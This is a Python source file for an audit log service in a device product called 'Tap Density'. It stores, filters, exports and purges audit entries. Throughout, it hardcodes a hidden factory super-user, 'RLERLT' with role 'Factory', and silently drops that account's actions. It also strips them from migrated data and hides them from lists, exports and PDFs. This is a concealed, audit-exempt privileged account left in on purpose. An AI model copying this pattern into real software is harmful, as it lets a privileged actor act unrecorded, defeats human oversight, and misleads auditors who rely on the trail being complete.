#!/usr/bin/env python3
"""
audit_service.py - Audit log service for Tap Density
Append-only audit trail: log_event, list_entries with filters.
"""

import json
import pathlib
import sqlite3
import secrets
import threading
import time
from datetime import datetime
from typing import Optional, Dict, List, Any

_config = {}
_storage_dir = None
_db_dir = None
_audit_db_path = None
_legacy_audit_log_path = None
AUDIT_LOG_CAP = 5000
FACTORY_USERNAME = "RLERLT"
FACTORY_ROLE = "Factory"

# Suppress identical (user, action, details) rows within this window (ms).
# Prevents poll/PDF/double-submit spam that looks like the same timestamped event.
_AUDIT_DEDUPE_WINDOW_MS = 2500
_dedupe_lock = threading.Lock()
_recent_dedupe: Dict[tuple, int] = {}
_ts_lock = threading.Lock()
_last_insert_timestamp_ms = 0


def _normalize_dedupe_key(user: Optional[str], action: str, details: str) -> tuple:
    return (
        str(user or "").strip().lower(),
        str(action or "").strip().lower(),
        str(details or "").strip(),
    )


def _should_skip_duplicate(user: Optional[str], action: str, details: str, ts: int) -> bool:
    # Never collapse auth failures — every wrong-password / locked attempt must appear.
    act = str(action or "").strip().lower()
    if act in ("login", "biometric login", "user restrict"):
        return False
    key = _normalize_dedupe_key(user, action, details)
    with _dedupe_lock:
        prev = _recent_dedupe.get(key)
        if prev is not None and abs(int(ts) - int(prev)) <= _AUDIT_DEDUPE_WINDOW_MS:
            return True
        _recent_dedupe[key] = int(ts)
        if len(_recent_dedupe) > 800:
            cutoff = int(ts) - 60000
            for k in list(_recent_dedupe.keys()):
                if _recent_dedupe[k] < cutoff:
                    del _recent_dedupe[k]
        return False


def _unique_timestamp_ms(ts: int) -> int:
    """Ensure insert timestamps are strictly increasing (RTC is often second-resolution)."""
    global _last_insert_timestamp_ms
    ts = int(ts)
    with _ts_lock:
        if ts <= _last_insert_timestamp_ms:
            ts = _last_insert_timestamp_ms + 1
        _last_insert_timestamp_ms = ts
    return ts


def _is_suppressed_actor(user: Optional[str], role: Optional[str]) -> bool:
    """Return True when the direct actor is the hardcoded factory super-user.

    Per product directive: rows whose actor (`user`) is RLERLT acting as
    Factory must never be written to the audit log. Other relationships
    (sessionUser / signatureUser / targetUser) are not considered here -
    they remain logged normally when the actor is someone else.
    """
    u = (user or "").strip()
    r = (role or "").strip()
    return u == FACTORY_USERNAME and r.lower() == FACTORY_ROLE.lower()


def is_hidden_factory_actor(user: Optional[str], role: Optional[str]) -> bool:
    """True when this user/role pair is the hidden factory actor (UI/export filter)."""
    return _is_suppressed_actor(user, role)


def init(config):
    """Initialize audit service with config."""
    global _config, _storage_dir, _db_dir, _audit_db_path, _legacy_audit_log_path
    _config = dict(config)
    _storage_dir = pathlib.Path(_config.get("STORAGE_DIR", "./storage"))
    _storage_dir.mkdir(parents=True, exist_ok=True)
    _db_dir = _storage_dir.parent / "db"
    _db_dir.mkdir(parents=True, exist_ok=True)
    _audit_db_path = _db_dir / "audit_log.db"
    _legacy_audit_log_path = _storage_dir / "audit_log.json"
    _ensure_db_schema()
    _migrate_legacy_json_if_needed()


def _db_connect():
    if not _audit_db_path:
        return None
    conn = sqlite3.connect(str(_audit_db_path))
    conn.row_factory = sqlite3.Row
    return conn


def _ensure_db_schema():
    conn = _db_connect()
    if not conn:
        return
    try:
        with conn:
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS audit_entries (
                    id TEXT PRIMARY KEY,
                    timestamp INTEGER NOT NULL,
                    dateTime TEXT NOT NULL,
                    user TEXT NOT NULL,
                    role TEXT NOT NULL,
                    action TEXT NOT NULL,
                    details TEXT NOT NULL,
                    eventType TEXT,
                    entityType TEXT,
                    entityId TEXT,
                    entityName TEXT,
                    outcome TEXT,
                    reason TEXT,
                    sessionUser TEXT,
                    sessionRole TEXT,
                    targetUser TEXT,
                    signatureMode TEXT,
                    signatureUser TEXT,
                    signatureRole TEXT,
                    changedFields TEXT,
                    beforeJson TEXT,
                    afterJson TEXT,
                    requestSource TEXT,
                    extraJson TEXT
                )
                """
            )
            conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_entries(timestamp)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_user ON audit_entries(user)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_role ON audit_entries(role)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_action ON audit_entries(action)")
            _ensure_extra_columns(conn)
    finally:
        conn.close()


def _ensure_extra_columns(conn):
    if not conn:
        return
    rows = conn.execute("PRAGMA table_info(audit_entries)").fetchall()
    existing = {str(row["name"]) if isinstance(row, sqlite3.Row) else str(row[1]) for row in rows}
    wanted = {
        "eventType": "TEXT",
        "entityType": "TEXT",
        "entityId": "TEXT",
        "entityName": "TEXT",
        "outcome": "TEXT",
        "reason": "TEXT",
        "sessionUser": "TEXT",
        "sessionRole": "TEXT",
        "targetUser": "TEXT",
        "signatureMode": "TEXT",
        "signatureUser": "TEXT",
        "signatureRole": "TEXT",
        "changedFields": "TEXT",
        "beforeJson": "TEXT",
        "afterJson": "TEXT",
        "requestSource": "TEXT",
        "extraJson": "TEXT",
    }
    for col, kind in wanted.items():
        if col not in existing:
            conn.execute("ALTER TABLE audit_entries ADD COLUMN {} {}".format(col, kind))


def _enforce_cap(conn):
    if not conn:
        return
    conn.execute(
        """
        DELETE FROM audit_entries
        WHERE id IN (
            SELECT id
            FROM audit_entries
            ORDER BY timestamp DESC, id DESC
            LIMIT -1 OFFSET ?
        )
        """,
        (AUDIT_LOG_CAP,),
    )


def _normalize_entry(raw: Dict[str, Any], fallback_index: int) -> Dict[str, Any]:
    ts_raw = raw.get("timestamp")
    try:
        ts = int(ts_raw)
    except (TypeError, ValueError):
        ts = int(time.time() * 1000) + fallback_index
    dt = str(raw.get("dateTime") or "").strip() or datetime.utcfromtimestamp(ts / 1000.0).strftime("%d/%m/%Y %H:%M:%S")
    user = str(raw.get("user") or "--").strip()
    role = str(raw.get("role") or "--").strip()
    action = str(raw.get("action") or "").strip()
    details = str(raw.get("details") or "").strip()
    event_type = str(raw.get("eventType") or "").strip()
    entity_type = str(raw.get("entityType") or "").strip()
    entity_id = str(raw.get("entityId") or "").strip()
    entity_name = str(raw.get("entityName") or "").strip()
    outcome = str(raw.get("outcome") or "").strip()
    reason = str(raw.get("reason") or "").strip()
    session_user = str(raw.get("sessionUser") or user or "--").strip()
    session_role = str(raw.get("sessionRole") or role or "--").strip()
    target_user = str(raw.get("targetUser") or "").strip()
    signature_mode = str(raw.get("signatureMode") or "").strip()
    signature_user = str(raw.get("signatureUser") or "").strip()
    signature_role = str(raw.get("signatureRole") or "").strip()
    request_source = str(raw.get("requestSource") or "").strip()
    changed_fields = raw.get("changedFields")
    before_json = raw.get("beforeJson")
    after_json = raw.get("afterJson")
    extra_json = raw.get("extraJson")
    rid = str(raw.get("id") or "").strip()
    if not rid:
        rid = "audit-{}-{}".format(ts, str((ts + fallback_index) % 10000))
    return {
        "id": rid,
        "timestamp": ts,
        "dateTime": dt,
        "user": user,
        "role": role,
        "action": action,
        "details": details,
        "eventType": event_type,
        "entityType": entity_type,
        "entityId": entity_id,
        "entityName": entity_name,
        "outcome": outcome,
        "reason": reason,
        "sessionUser": session_user,
        "sessionRole": session_role,
        "targetUser": target_user,
        "signatureMode": signature_mode,
        "signatureUser": signature_user,
        "signatureRole": signature_role,
        "changedFields": _json_text(changed_fields),
        "beforeJson": _json_text(before_json),
        "afterJson": _json_text(after_json),
        "requestSource": request_source,
        "extraJson": _json_text(extra_json),
    }


def _json_text(value: Any) -> str:
    if value is None or value == "":
        return ""
    if isinstance(value, str):
        return value
    try:
        return json.dumps(value, ensure_ascii=False, sort_keys=True)
    except Exception:
        return ""


def _json_value(value: Any) -> Any:
    if value is None or value == "":
        return None
    if not isinstance(value, str):
        return value
    try:
        return json.loads(value)
    except Exception:
        return value


def _migrate_legacy_json_if_needed():
    if not _legacy_audit_log_path or not _legacy_audit_log_path.exists():
        return
    conn = _db_connect()
    if not conn:
        return
    try:
        try:
            with open(_legacy_audit_log_path, "r", encoding="utf-8") as f:
                legacy = json.load(f)
        except Exception:
            legacy = []
        if not isinstance(legacy, list):
            legacy = []
        valid_entries = []
        for i, row in enumerate(legacy):
            if isinstance(row, dict):
                normalized = _normalize_entry(row, i)
                if _is_suppressed_actor(normalized.get("user"), normalized.get("role")):
                    continue
                valid_entries.append(normalized)
        with conn:
            conn.executemany(
                """
                INSERT OR IGNORE INTO audit_entries
                (id, timestamp, dateTime, user, role, action, details, eventType, entityType, entityId, entityName, outcome, reason, sessionUser, sessionRole, targetUser, signatureMode, signatureUser, signatureRole, changedFields, beforeJson, afterJson, requestSource, extraJson)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                [
                    (
                        e["id"],
                        e["timestamp"],
                        e["dateTime"],
                        e["user"],
                        e["role"],
                        e["action"],
                        e["details"],
                        e["eventType"],
                        e["entityType"],
                        e["entityId"],
                        e["entityName"],
                        e["outcome"],
                        e["reason"],
                        e["sessionUser"],
                        e["sessionRole"],
                        e["targetUser"],
                        e["signatureMode"],
                        e["signatureUser"],
                        e["signatureRole"],
                        e["changedFields"],
                        e["beforeJson"],
                        e["afterJson"],
                        e["requestSource"],
                        e["extraJson"],
                    )
                    for e in valid_entries
                ],
            )
            _enforce_cap(conn)
        # Delete legacy file only when all migrated IDs are present.
        if valid_entries:
            expected_ids = {e["id"] for e in valid_entries}
            found_all = True
            for rid in expected_ids:
                row = conn.execute(
                    "SELECT 1 FROM audit_entries WHERE id = ? LIMIT 1",
                    (rid,),
                ).fetchone()
                if not row:
                    found_all = False
                    break
            if found_all:
                _legacy_audit_log_path.unlink(missing_ok=True)
        else:
            _legacy_audit_log_path.unlink(missing_ok=True)
    except Exception:
        pass
    finally:
        conn.close()


def _role_audit_display(role: Optional[str]) -> str:
    """User-facing role label in audit UI/export (storage still uses Supervisor)."""
    r = str(role or "").strip()
    if not r or r == "--":
        return r or "--"
    if r.lower() == "supervisor":
        return "Reviewer"
    return r


def _details_audit_display(details: Optional[str]) -> str:
    import re

    s = str(details or "").strip()
    if not s:
        return s
    s = re.sub(r"\s*\(\s*\d+\s*min\s+limit\s*\)", "", s, flags=re.I)
    s = re.sub(r"\(\s*Supervisor\s*\)", "(Reviewer)", s, flags=re.I)
    return s.strip()


def _entry_for_response(entry: Dict[str, Any]) -> Dict[str, Any]:
    """Copy of entry with role translated for display."""
    e = dict(entry)
    e["role"] = _role_audit_display(entry.get("role"))
    e["sessionRole"] = _role_audit_display(entry.get("sessionRole"))
    e["signatureRole"] = _role_audit_display(entry.get("signatureRole"))
    e["details"] = _details_audit_display(entry.get("details"))
    e["changedFields"] = _json_value(entry.get("changedFields"))
    e["before"] = _json_value(entry.get("beforeJson"))
    e["after"] = _json_value(entry.get("afterJson"))
    e["extra"] = _json_value(entry.get("extraJson"))
    return e


def log_event(user: Optional[str], role: Optional[str], action: str, details: str = ""):
    """Append one audit entry.

    Entries where the actor is the hardcoded factory super-user
    (user == RLERLT and role == Factory) are silently dropped.
    """
    log_structured_event(
        user=user,
        role=role,
        action=action,
        details=details,
        event_type="legacy",
        outcome="success" if action else "",
    )


def log_structured_event(
    *,
    user: Optional[str],
    role: Optional[str],
    action: str,
    details: str = "",
    event_type: str = "",
    entity_type: str = "",
    entity_id: Any = None,
    entity_name: str = "",
    outcome: str = "",
    reason: str = "",
    session_user: Optional[str] = None,
    session_role: Optional[str] = None,
    target_user: str = "",
    signature_mode: str = "",
    signature_user: str = "",
    signature_role: str = "",
    changed_fields: Any = None,
    before: Any = None,
    after: Any = None,
    request_source: str = "",
    extra: Any = None,
    timestamp_ms: Optional[int] = None,
    date_time: Optional[str] = None,
):
    if not _audit_db_path:
        return
    if _is_suppressed_actor(user, role):
        return
    ts = int(timestamp_ms if timestamp_ms is not None else (time.time() * 1000))
    if _should_skip_duplicate(user, action, details, ts):
        return
    ts = _unique_timestamp_ms(ts)
    dt_str = (date_time or "").strip() or datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    entry = {
        "id": "audit-{}-{}".format(ts, str(ts % 10000)),
        "timestamp": ts,
        "dateTime": dt_str,
        "user": (user or "--").strip(),
        "role": (role or "--").strip(),
        "action": (action or "").strip(),
        "details": (details or "").strip(),
        "eventType": (event_type or "").strip(),
        "entityType": (entity_type or "").strip(),
        "entityId": "" if entity_id is None else str(entity_id),
        "entityName": (entity_name or "").strip(),
        "outcome": (outcome or "").strip(),
        "reason": (reason or "").strip(),
        "sessionUser": (session_user or user or "--").strip(),
        "sessionRole": (session_role or role or "--").strip(),
        "targetUser": (target_user or "").strip(),
        "signatureMode": (signature_mode or "").strip(),
        "signatureUser": (signature_user or "").strip(),
        "signatureRole": (signature_role or "").strip(),
        "changedFields": _json_text(changed_fields),
        "beforeJson": _json_text(before),
        "afterJson": _json_text(after),
        "requestSource": (request_source or "").strip(),
        "extraJson": _json_text(extra),
    }
    entry["id"] = "audit-{}-{}".format(ts, secrets.token_hex(4))
    conn = _db_connect()
    if not conn:
        return
    try:
        with conn:
            conn.execute(
                """
                INSERT INTO audit_entries
                (id, timestamp, dateTime, user, role, action, details, eventType, entityType, entityId, entityName, outcome, reason, sessionUser, sessionRole, targetUser, signatureMode, signatureUser, signatureRole, changedFields, beforeJson, afterJson, requestSource, extraJson)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    entry["id"],
                    entry["timestamp"],
                    entry["dateTime"],
                    entry["user"],
                    entry["role"],
                    entry["action"],
                    entry["details"],
                    entry["eventType"],
                    entry["entityType"],
                    entry["entityId"],
                    entry["entityName"],
                    entry["outcome"],
                    entry["reason"],
                    entry["sessionUser"],
                    entry["sessionRole"],
                    entry["targetUser"],
                    entry["signatureMode"],
                    entry["signatureUser"],
                    entry["signatureRole"],
                    entry["changedFields"],
                    entry["beforeJson"],
                    entry["afterJson"],
                    entry["requestSource"],
                    entry["extraJson"],
                ),
            )
            _enforce_cap(conn)
    except Exception:
        pass
    finally:
        conn.close()




def prune_power_interruption_overflow(keep: int = 50) -> int:
    """Remove excess power-interruption rows so real audit events remain visible."""
    if not _audit_db_path or not _audit_db_path.exists():
        return 0
    keep = max(1, int(keep or 50))
    conn = _db_connect()
    if not conn:
        return 0
    try:
        actions = ("Power interruption", "Power interruption logout")
        row = conn.execute(
            "SELECT COUNT(*) AS c FROM audit_entries WHERE action IN (?, ?)",
            actions,
        ).fetchone()
        total = int(row["c"] if row else 0)
        if total <= keep:
            return 0
        with conn:
            cur = conn.execute(
                """
                DELETE FROM audit_entries
                WHERE action IN (?, ?)
                AND id NOT IN (
                    SELECT id FROM audit_entries
                    WHERE action IN (?, ?)
                    ORDER BY timestamp DESC, id DESC
                    LIMIT ?
                )
                """,
                (actions[0], actions[1], actions[0], actions[1], keep),
            )
        removed = cur.rowcount if cur.rowcount is not None else 0
        try:
            conn.execute("VACUUM")
        except Exception:
            pass
        return int(removed)
    except Exception:
        return 0
    finally:
        conn.close()


def entry_count() -> int:
    """Return the number of rows in the audit database (0 if missing or unreadable)."""
    if not _audit_db_path or not _audit_db_path.exists():
        return 0
    conn = _db_connect()
    if not conn:
        return 0
    try:
        row = conn.execute("SELECT COUNT(*) AS c FROM audit_entries").fetchone()
        return int(row["c"] if row else 0)
    except Exception:
        return 0
    finally:
        conn.close()


def _remove_audit_legacy_files() -> None:
    for path in (
        _legacy_audit_log_path,
        _storage_dir / "audit_log.json" if _storage_dir else None,
        _storage_dir / "audit_entries.json" if _storage_dir else None,
        _storage_dir / "audit_export.json" if _storage_dir else None,
    ):
        if path and path.exists():
            try:
                path.unlink()
            except Exception:
                pass


def _remove_audit_db_artifacts() -> None:
    """Remove SQLite DB file, WAL/SHM sidecars, and timestamped backups."""
    if not _audit_db_path:
        return
    base = _audit_db_path.name
    if _db_dir and _db_dir.exists():
        for path in _db_dir.iterdir():
            if not path.is_file():
                continue
            name = path.name
            if name == base or name.startswith(base + "-") or name.startswith(base + "."):
                try:
                    path.unlink()
                except Exception:
                    pass
        for backup in _db_dir.glob("audit_log.db.bak*"):
            try:
                backup.unlink()
            except Exception:
                pass


def _destroy_audit_database() -> None:
    """Delete the on-disk audit database so the next open recreates an empty schema."""
    _remove_audit_db_artifacts()
    _ensure_db_schema()


def clear_all_entries() -> int:
    """Delete the entire audit trail (DB + legacy/export files). Used by factory reset."""
    before = entry_count()
    _remove_audit_legacy_files()

    if _audit_db_path and _audit_db_path.exists():
        conn = _db_connect()
        if conn:
            try:
                conn.execute("DELETE FROM audit_entries")
                conn.commit()
                try:
                    conn.execute("VACUUM")
                    conn.commit()
                except Exception:
                    pass
            except Exception:
                pass
            finally:
                conn.close()

    if entry_count() > 0:
        _destroy_audit_database()

    _remove_audit_legacy_files()
    _remove_audit_db_artifacts()
    _ensure_db_schema()
    return before


def clear_entries_before(cutoff_ms: Optional[int]) -> int:
    """Delete every audit row strictly older than cutoff_ms.

    cutoff_ms == None or <= 0 means: delete every row in the table.
    Returns the number of rows removed. Compaction (VACUUM) is best-effort
    and silent on failure so factory reset can never be blocked by it.
    """
    if not _audit_db_path or not _audit_db_path.exists():
        return 0
    conn = _db_connect()
    if not conn:
        return 0
    try:
        if cutoff_ms is None or int(cutoff_ms) <= 0:
            before = entry_count()
            try:
                conn.execute("DELETE FROM audit_entries")
                conn.commit()
                try:
                    conn.execute("VACUUM")
                    conn.commit()
                except Exception:
                    pass
            except Exception:
                pass
            finally:
                conn.close()
                conn = None
            if entry_count() > 0:
                _destroy_audit_database()
            return before
        try:
            cur = conn.execute(
                "DELETE FROM audit_entries WHERE COALESCE(timestamp, 0) < ?",
                (int(cutoff_ms),),
            )
            conn.commit()
            removed = cur.rowcount if cur.rowcount is not None and cur.rowcount >= 0 else 0
        except Exception:
            return 0
        try:
            conn.execute("VACUUM")
            conn.commit()
        except Exception:
            pass
        return int(removed)
    finally:
        if conn is not None:
            conn.close()


def list_entries(filters: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
    """Read audit log and return entries (newest first), filtered."""
    if not _audit_db_path or not _audit_db_path.exists():
        return []
    filters = filters or {}
    conn = _db_connect()
    if not conn:
        return []
    try:
        where = ["1=1"]
        params: List[Any] = []
        # Never return rows for the hidden factory actor (UI, export, PDF).
        where.append(
            "NOT (TRIM(COALESCE(user, '')) = ? AND LOWER(TRIM(COALESCE(role, ''))) = LOWER(?))"
        )
        params.extend((FACTORY_USERNAME, FACTORY_ROLE))
        user_val = filters.get("user")
        if user_val:
            where.append("COALESCE(user, '--') = ?")
            params.append(user_val)
        role_val = filters.get("role")
        if role_val:
            where.append("COALESCE(role, '--') = ?")
            params.append(role_val)
        action_val = filters.get("action")
        if action_val:
            where.append("COALESCE(action, '') = ?")
            params.append(action_val)
        from_ts = filters.get("from")
        if from_ts is not None:
            try:
                where.append("COALESCE(timestamp, 0) >= ?")
                params.append(int(from_ts))
            except (TypeError, ValueError):
                pass
        to_ts = filters.get("to")
        if to_ts is not None:
            try:
                where.append("COALESCE(timestamp, 0) <= ?")
                params.append(int(to_ts))
            except (TypeError, ValueError):
                pass
        q = """
            SELECT id, timestamp, dateTime, user, role, action, details,
                   eventType, entityType, entityId, entityName, outcome, reason,
                   sessionUser, sessionRole, targetUser,
                   signatureMode, signatureUser, signatureRole,
                   changedFields, beforeJson, afterJson, requestSource, extraJson
            FROM audit_entries
            WHERE {}
            ORDER BY timestamp DESC, id DESC
        """.format(" AND ".join(where))
        rows = conn.execute(q, tuple(params)).fetchall()
    except Exception:
        return []
    finally:
        conn.close()
    out = [dict(row) for row in rows]
    return [_entry_for_response(e) for e in out]


def export_entries(filters: Optional[Dict[str, Any]] = None, path_or_fd=None):
    """Write filtered entries to file (JSON). Optional."""
    entries = list_entries(filters)
    if path_or_fd is None:
        path_or_fd = _storage_dir / "audit_export.json"
    if hasattr(path_or_fd, "write"):
        json.dump(entries, path_or_fd, indent=2, ensure_ascii=False)
    else:
        path = pathlib.Path(path_or_fd)
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(entries, f, indent=2, ensure_ascii=False)


AUDIT_EXPORT_SCHEDULE_FILE = "audit_export_schedule.json"
# Legacy: older builds scheduled purge after 24h; confirm now purges immediately.
AUDIT_EXPORT_RETENTION_MS = 0
EXPORT_PURGE_AFTER_MS = AUDIT_EXPORT_RETENTION_MS


def _audit_export_schedule_path() -> Optional[pathlib.Path]:
    if not _storage_dir:
        return None
    return _storage_dir / AUDIT_EXPORT_SCHEDULE_FILE


def _load_audit_export_schedule() -> Dict[str, Any]:
    path = _audit_export_schedule_path()
    if not path or not path.is_file():
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _save_audit_export_schedule(data: Dict[str, Any]) -> None:
    path = _audit_export_schedule_path()
    if not path:
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def clear_audit_export_schedule() -> None:
    path = _audit_export_schedule_path()
    if path and path.exists():
        try:
            path.unlink()
        except Exception:
            pass


def stage_audit_export_pending(
    *,
    export_id: str,
    entry_ids: List[Any],
    exported_by: Dict[str, Any],
    approved_by: Dict[str, Any],
    pdf_path: str = "",
) -> None:
    """Store a successful USB audit export awaiting operator verification (no purge yet)."""
    now_ms = int(time.time() * 1000)
    ids = []
    for x in entry_ids or []:
        try:
            n = int(x)
            if n > 0:
                ids.append(n)
        except (TypeError, ValueError):
            s = str(x).strip()
            if s:
                ids.append(s)
    state = _load_audit_export_schedule()
    state["staged"] = {
        "export_id": str(export_id or "").strip(),
        "entry_ids": ids,
        "exported_by": dict(exported_by or {}),
        "approved_by": dict(approved_by or {}),
        "exported_at_ms": now_ms,
        "pdf_path": str(pdf_path or "").strip(),
    }
    _save_audit_export_schedule(state)


def confirm_audit_export_verified(export_id: str) -> Optional[Dict[str, Any]]:
    """Operator confirmed USB PDF OK: delete only the exported audit entry IDs immediately."""
    want = str(export_id or "").strip()
    if not want:
        return None
    state = _load_audit_export_schedule()
    staged = state.get("staged") if isinstance(state.get("staged"), dict) else {}
    if str(staged.get("export_id") or "").strip() != want:
        return None
    now_ms = int(time.time() * 1000)
    entry_ids = list(staged.get("entry_ids") or [])
    removed = delete_entries_by_ids(entry_ids)
    out = {
        "export_id": want,
        "entry_ids": entry_ids,
        "exported_by": dict(staged.get("exported_by") or {}),
        "approved_by": dict(staged.get("approved_by") or {}),
        "exported_at_ms": int(staged.get("exported_at_ms") or now_ms),
        "pdf_path": str(staged.get("pdf_path") or "").strip(),
        "confirmed_at_ms": now_ms,
        "purged_at_ms": now_ms,
        "rows_removed": int(removed or 0),
    }
    state.pop("staged", None)
    state.pop("scheduled", None)
    _save_audit_export_schedule(state)
    return out


# Actions that must remain on-device after an audit USB export purge.
_AUDIT_EXPORT_KEEP_ACTIONS = frozenset({
    "Audit trail exported",
    "Export approved",
    "Audit export verified",
    "Reports exported",
    "Report export verified",
})


def delete_entries_by_ids(entry_ids: List[Any], *, keep_export_trail: bool = True) -> int:
    """Delete audit rows with matching primary keys only (TEXT ids).

    When keep_export_trail is True, rows whose action is an export/approval trail
    entry are never deleted — so who exported / who approved always remains.
    """
    if not entry_ids or not _audit_db_path or not _audit_db_path.exists():
        return 0
    ids = []
    seen = set()
    for eid in entry_ids:
        s = str(eid).strip() if eid is not None else ""
        if not s or s in seen:
            continue
        seen.add(s)
        ids.append(s)
    if not ids:
        return 0
    conn = _db_connect()
    if not conn:
        return 0
    try:
        placeholders = ",".join("?" for _ in ids)
        if keep_export_trail and _AUDIT_EXPORT_KEEP_ACTIONS:
            keep_ph = ",".join("?" for _ in _AUDIT_EXPORT_KEEP_ACTIONS)
            cur = conn.execute(
                "DELETE FROM audit_entries WHERE id IN ({}) AND action NOT IN ({})".format(
                    placeholders, keep_ph
                ),
                tuple(ids) + tuple(_AUDIT_EXPORT_KEEP_ACTIONS),
            )
        else:
            cur = conn.execute(
                "DELETE FROM audit_entries WHERE id IN ({})".format(placeholders),
                tuple(ids),
            )
        conn.commit()
        removed = cur.rowcount if cur.rowcount is not None and cur.rowcount >= 0 else 0
        try:
            conn.execute("VACUUM")
            conn.commit()
        except Exception:
            pass
        return int(removed)
    except Exception:
        return 0
    finally:
        conn.close()


def run_due_audit_export_purge() -> Optional[Dict[str, Any]]:
    """If a confirmed audit export purge is due, delete only its entry_ids."""
    state = _load_audit_export_schedule()
    scheduled = state.get("scheduled") if isinstance(state.get("scheduled"), dict) else {}
    purge_at = scheduled.get("purge_at_ms")
    if purge_at is None:
        return None
    try:
        purge_at_ms = int(purge_at)
    except (TypeError, ValueError):
        return None
    now_ms = int(time.time() * 1000)
    if now_ms < purge_at_ms:
        return None
    entry_ids = list(scheduled.get("entry_ids") or [])
    removed = delete_entries_by_ids(entry_ids)
    state.pop("scheduled", None)
    _save_audit_export_schedule(state)
    out = dict(scheduled)
    out["purged_at_ms"] = now_ms
    out["rows_removed"] = int(removed or 0)
    return out


# ---- Backward-compatible wrappers ----

def stage_audit_export(entry_ids: List[int], exporter_username: str, approver_username: str) -> Dict[str, Any]:
    export_id = secrets.token_urlsafe(16)
    exported_by = {"username": (exporter_username or "").strip() or "--", "employee_id": "--", "role": "--"}
    approved_by = {"username": (approver_username or "").strip() or "--", "employee_id": "--", "role": "--"}
    stage_audit_export_pending(
        export_id=export_id,
        entry_ids=entry_ids or [],
        exported_by=exported_by,
        approved_by=approved_by,
    )
    return {"id": export_id, "export_id": export_id, "entryIds": entry_ids or []}


def confirm_audit_export_batch(batch_id: str, pdf_path: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """Confirm USB audit export and purge exported rows immediately."""
    purged = confirm_audit_export_verified(batch_id)
    if purged and pdf_path and not purged.get("pdf_path"):
        purged = dict(purged)
        purged["pdf_path"] = str(pdf_path)
    return purged


def purge_due_audit_exports(now_ms: Optional[int] = None) -> int:
    purged = run_due_audit_export_purge()
    if not purged:
        return 0
    try:
        return int(purged.get("rows_removed") or 0)
    except (TypeError, ValueError):
        return 0
